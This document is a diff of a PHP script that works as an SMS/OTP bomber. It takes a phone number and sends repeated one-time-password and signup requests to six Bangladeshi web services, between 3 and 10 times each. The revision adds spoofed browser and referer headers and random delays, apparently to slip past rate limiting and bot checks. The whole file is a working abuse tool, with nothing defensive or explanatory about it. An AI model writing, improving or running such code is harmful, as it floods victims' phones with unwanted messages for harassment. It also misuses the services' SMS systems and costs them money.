@@ -2,67 +2,80 @@
 header('Content-Type: application/json');
 set_time_limit(0); 
 
-if(!isset($_GET['phone']) || empty($_GET['phone'])){
-    echo json_encode(["status" => "error", "message" => "Phone number missing"]);
-    exit;
+$phone = $_GET['phone'] ?? '';
+if(empty($phone)) {
+    die(json_encode(["status" => "error", "message" => "Phone number missing"]));
 }
 
-$phone = $_GET['phone'];
 $phone_11 = (substr($phone, 0, 2) === "88") ? substr($phone, 2) : $phone;
-$phone_plus88 = "+88" . $phone_11;
+$phone_88 = "88" . $phone_11;
 
-$responses = [];
-
-// Request pathanor time-er moddhe random gap toiri korar function
-function send_sms($url, $method = 'GET', $data = null, $headers = [], $timeout = 30) {
-    // Random delay: 3 theke 5 second er moddhe random time wait korbe
-    sleep(rand(3, 5)); 
+function execute_request($url, $method = 'POST', $data = [], $headers = []) {
+    // প্রতিটি রিকোয়েস্টের মাঝে ৩ থেকে ৫ সেকেন্ডের র‍্যান্ডম বিরতি
+    sleep(rand(3, 5));
     
     $ch = curl_init();
+    $default_headers = [
+        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
+        'Accept: application/json, text/plain, */*',
+        'Accept-Language: en-US,en;q=0.9',
+        'Connection: keep-alive'
+    ];
+    
     curl_setopt_array($ch, [
         CURLOPT_URL => $url,
         CURLOPT_RETURNTRANSFER => true,
         CURLOPT_SSL_VERIFYPEER => false,
-        CURLOPT_TIMEOUT => $timeout,
         CURLOPT_CUSTOMREQUEST => $method,
-        CURLOPT_POSTFIELDS => ($data ? json_encode($data) : null),
-        CURLOPT_HTTPHEADER => $headers
+        CURLOPT_POSTFIELDS => $data ? json_encode($data) : null,
+        CURLOPT_HTTPHEADER => array_merge($default_headers, $headers),
+        CURLOPT_TIMEOUT => 25,
+        CURLOPT_FOLLOWLOCATION => true
     ]);
+    
     $res = curl_exec($ch);
-    $err = curl_error($ch);
+    $info = curl_getinfo($ch);
     curl_close($ch);
-    return $err ? ["error" => $err] : (json_decode($res, true) ?: $res);
+    return ["status" => $info['http_code'], "response" => json_decode($res, true) ?: $res];
 }
 
-// Shikho - 3 bar
+$results = [];
+
+// 1. Shikho (3 বার)
 for($i=1; $i<=3; $i++){
-    $responses["shikho_$i"] = send_sms('https://api.shikho.com/auth/v2/send/sms', 'POST', ["phone" => "88".$phone_11, "type" => "student"], ['Content-Type: application/json']);
+    $results["shikho_$i"] = execute_request('https://api.shikho.com/auth/v2/send/sms', 'POST', 
+        ["phone" => $phone_88, "type" => "student", "auth_type" => "signup"], 
+        ['Content-Type: application/json', 'Referer: https://shikho.com/']);
 }
 
-// RedX - 10 bar
+// 2. RedX (10 বার)
 for($i=1; $i<=10; $i++){
-    $responses["redx_$i"] = send_sms('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp', 'POST', ["phoneNumber" => $phone_11], ['Content-Type: application/json']);
+    $results["redx_$i"] = execute_request('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp', 'POST', 
+        ["phoneNumber" => $phone_11], ['Content-Type: application/json']);
 }
 
-// Bikroy - 10 bar
+// 3. Bikroy (10 বার)
 for($i=1; $i<=10; $i++){
-    $responses["bikroy_$i"] = send_sms("https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11", 'GET', null, ['User-Agent: Mozilla/5.0']);
+    $results["bikroy_$i"] = execute_request("https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11", 'GET');
 }
 
-// PBS - 5 bar
+// 4. PBS (5 বার)
 for($i=1; $i<=5; $i++){
-    $responses["pbs_$i"] = send_sms('https://apialpha.pbs.com.bd/api/OTP/generateOTP', 'POST', ["userPhone" => $phone_11], ['Content-Type: application/json']);
+    $results["pbs_$i"] = execute_request('https://apialpha.pbs.com.bd/api/OTP/generateOTP', 'POST', 
+        ["userPhone" => $phone_11], ['Content-Type: application/json']);
 }
 
-// Iqra Live - 3 bar
+// 5. Iqra Live (3 বার)
 for($i=1; $i<=3; $i++){
-    $responses["iqra_$i"] = send_sms("https://apibeta.iqra-live.com/api/v2/sent-otp/".$phone_11, 'GET', null, ['User-Agent: Mozilla/5.0']);
+    $results["iqra_$i"] = execute_request("https://apibeta.iqra-live.com/api/v2/sent-otp/".$phone_11, 'GET');
 }
 
-// BDTickets - 5 bar
+// 6. BDTickets (5 বার)
 for($i=1; $i<=5; $i++){
-    $responses["bdtickets_$i"] = send_sms('https://api.bdtickets.com:20100/v1/auth', 'POST', ["createUserCheck"=>true,"phoneNumber"=>$phone_plus88,"applicationChannel"=>"WEB_APP"], ['Content-Type: application/json']);
+    $results["bdtickets_$i"] = execute_request('https://api.bdtickets.com:20100/v1/auth', 'POST', 
+        ["createUserCheck"=>true,"phoneNumber"=>$phone_88,"applicationChannel"=>"WEB_APP"], 
+        ['Content-Type: application/json', 'Host: api.bdtickets.com:20100', 'Referer: https://bdtickets.com/']);
 }
 
-echo json_encode($responses, JSON_PRETTY_PRINT);
+echo json_encode($results, JSON_PRETTY_PRINT);
 ?>
